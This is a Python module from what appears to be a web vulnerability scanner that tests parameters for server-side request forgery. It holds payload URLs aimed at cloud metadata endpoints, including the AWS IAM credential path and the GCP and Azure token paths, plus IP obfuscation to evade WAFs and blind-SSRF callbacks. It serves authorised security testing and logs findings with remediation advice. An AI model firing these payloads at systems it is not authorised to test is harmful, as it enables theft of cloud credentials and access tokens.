"""
modules/ssrf.py
Server-Side Request Forgery (SSRF) test module.

Covers:
  - Internal host probing (localhost, AWS/GCP/Azure/DO/Alibaba metadata)
  - IP obfuscation variants when WAF is detected
  - Blind SSRF via OOB callback

Entry point: async def run(scanner) -> None

For Authorized Security Testing and CTF Competitions Only.
"""
from __future__ import annotations

import urllib.parse
from typing import TYPE_CHECKING

from core.models import Vulnerability, calculate_severity

if TYPE_CHECKING:
    from core.scanner import BaseScanner

# ── (target_url, [response_indicators]) ──────────────────────────────────────
INTERNAL_TARGETS = [
    ("http://localhost", ["localhost", "127.0.0.1"]),
    ("http://127.0.0.1", ["localhost", "127.0.0.1"]),
    ("http://0.0.0.0", ["0.0.0.0"]),
    # AWS
    ("http://169.254.169.254/latest/meta-data/",
     ["ami-id", "instance-id", "local-hostname", "iam"]),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     ["AccessKeyId", "SecretAccessKey"]),
    # GCP
    ("http://metadata.google.internal/computeMetadata/v1/",
     ["computeMetadata", "project-id", "serviceAccounts"]),
    ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
     ["access_token", "token_type"]),
    # Azure
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01",
     ["subscriptionId", "resourceGroupName"]),
    ("http://169.254.169.254/metadata/identity/oauth2/token"
     "?api-version=2018-02-01&resource=https://management.azure.com/",
     ["access_token"]),
    # DigitalOcean
    ("http://169.254.169.254/metadata/v1/", ["droplet_id", "hostname", "vendor-data"]),
    # Alibaba
    ("http://100.100.100.200/latest/meta-data/", ["instance-id", "zone-id"]),
    # Generic internal ranges
    ("http://192.168.1.1", ["192.168", "router", "gateway"]),
    ("http://10.0.0.1", ["10.0.0", "gateway"]),
]


def _is_loopback(url: str) -> bool:
    """Return True if url's host is a loopback address."""
    host = urllib.parse.urlparse(url).hostname or ""
    return host in ("localhost", "127.0.0.1", "0.0.0.0", "::1")


async def run(scanner: "BaseScanner", url: str, param: str, method: str = "GET") -> None:
    """Test a single parameter for SSRF. Called per-param by scan_url()."""
    # V24: skip guessed GET params
    if method == "GET":
        parsed = urllib.parse.urlparse(url)
        if param not in set(urllib.parse.parse_qs(parsed.query).keys()):
            return
    await _test_ssrf(scanner, url, param, method)
    if scanner.oob_server.running:
        await _test_blind_ssrf(scanner, url, param, method)


async def _test_ssrf(scanner: "BaseScanner", url: str, param: str, method: str) -> bool:
    # V29 FIX: baseline — indicator must be NEW (absent from uninjected response)
    baseline = await scanner.make_request(method, url, params={param: "https://www.example.com"})
    baseline_text = baseline.text if baseline else ""

    # V29 FIX: when scanning a loopback app, strip loopback strings from
    # loopback-target indicators — they appear in every self-hosted response.
    scanning_loopback = _is_loopback(scanner.base_url)

    for target, indicators in INTERNAL_TARGETS:
        effective_indicators = list(indicators)
        if scanning_loopback and _is_loopback(target):
            effective_indicators = [
                i for i in effective_indicators
                if i not in ("localhost", "127.0.0.1", "0.0.0.0", "::1")
            ]
        if not effective_indicators:
            continue

        test_targets = [target]
        # IP obfuscation if WAF detected
        if scanner.waf_detected:
            ip_part = target.split("//")[1].split("/")[0].split(":")[0]
            if ip_part.replace(".", "").isdigit():
                obf_variants = scanner.waf_evasion.obfuscate_ip(ip_part)
                test_targets += [target.replace(ip_part, v) for v in obf_variants[:2]]

        for test_target in test_targets:
            res = await scanner.make_request(method, url, params={param: test_target})
            if res:
                # V29 FIX: only count indicators absent from baseline
                matched = [
                    ind for ind in effective_indicators
                    if ind in res.text and ind not in baseline_text
                ]
                if matched:
                    severity, cvss = calculate_severity("SSRF")
                    scanner.log_vuln(Vulnerability(
                        type="SSRF",
                        url=url,
                        parameter=param,
                        payload=test_target,
                        evidence=f"New indicators in injected response: {matched[:3]}",
                        confidence="High",
                        severity=severity,
                        cvss_score=cvss,
                        method=method,
                        detection_method="Baseline-differential indicator matching",
                        remediation=(
                            "Validate and allowlist all outbound URLs server-side. "
                            "Block access to cloud metadata IPs (169.254.169.254, etc). "
                            "Use a network-level egress proxy/firewall."
                        ),
                        references=["CWE-918", "OWASP-A10:2021"],
                    ))
                    return True
    return False


async def _test_blind_ssrf(scanner: "BaseScanner", url: str, param: str, method: str) -> bool:
    """Blind SSRF via OOB HTTP callback."""
    identifier = scanner.oob_server.generate_identifier()
    oob_url = scanner.oob_server.get_oob_url(identifier)

    await scanner.make_request(method, url, params={param: oob_url})

    if scanner.oob_server.check_interaction(identifier, 8.0):
        severity, cvss = calculate_severity("Blind SSRF")
        scanner.log_vuln(Vulnerability(
            type="Blind SSRF",
            url=url,
            parameter=param,
            payload=oob_url,
            evidence=f"OOB HTTP callback received for identifier {identifier[:8]}",
            confidence="High",
            severity=severity,
            cvss_score=cvss,
            method=method,
            detection_method="Out-of-band HTTP callback",
            remediation=(
                "Validate and allowlist outbound URLs. "
                "Block all requests to internal/metadata IP ranges at the network layer."
            ),
            references=["CWE-918", "OWASP-A10:2021"],
        ))
        return True
    return False
